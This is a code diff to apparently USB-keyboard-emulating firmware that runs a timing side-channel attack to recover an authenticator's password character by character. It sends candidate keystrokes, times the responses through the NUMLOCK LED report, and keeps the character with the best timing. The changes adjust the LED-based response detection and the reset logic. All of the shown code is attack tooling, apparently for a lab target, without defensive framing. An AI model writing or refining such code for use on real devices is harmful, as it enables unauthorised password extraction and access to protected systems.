@@ -19,7 +19,6 @@ static uint8_t confirmed_len = 0;
 // Timing measurement state
 static uint32_t timings[86] = {0};
 static uint32_t start_time = 0;
-static uint8_t last_led_state = 0;
 static volatile uint32_t timer_ms = 0;
 
 // Control flags
@@ -227,6 +226,12 @@ void AttackCreateReport(USB_KeyboardReport_Data_t* report)
 		return;
 	}
 
+	// Wait for LED response before sending more keystrokes
+	if (waiting_for_response)
+	{
+		return;
+	}
+
 	// Try all characters in charset for current password position
 	if (curr_char_id < PasswordSetOfCharsLen)
 	{
@@ -335,23 +340,20 @@ static void findBestTimeAndExtractPasswordChar(void)
 
 	// Reset for next character - CAPSLOCK detection handles completion
 	curr_char_id = 0;
+	position_id_in_attempt = 0;
 	memset(timings, 0, sizeof(timings));
 }
 
-// Process LED state changes for timing measurement
+// Process LED response for timing measurement (like ref.c approach)
 void AttackProcessResponse(uint8_t* led_report)
 {
-	uint8_t current_led_state = *led_report;
-
-	// Record timing when LED state changes (authenticator response)
-	if (waiting_for_response && (current_led_state != last_led_state))
+	// Check if NUMLOCK is ON - this signals authenticator response (same as ref.c)
+	if ((*led_report & HID_KEYBOARD_LED_NUMLOCK) && waiting_for_response)
 	{
 		uint32_t end_time = timer_ms;
 		timings[curr_char_id++] = end_time - start_time;
 		waiting_for_response = false;
 	}
-
-	last_led_state = current_led_state;
 }
 
 void MarkAttackCompleted(void)
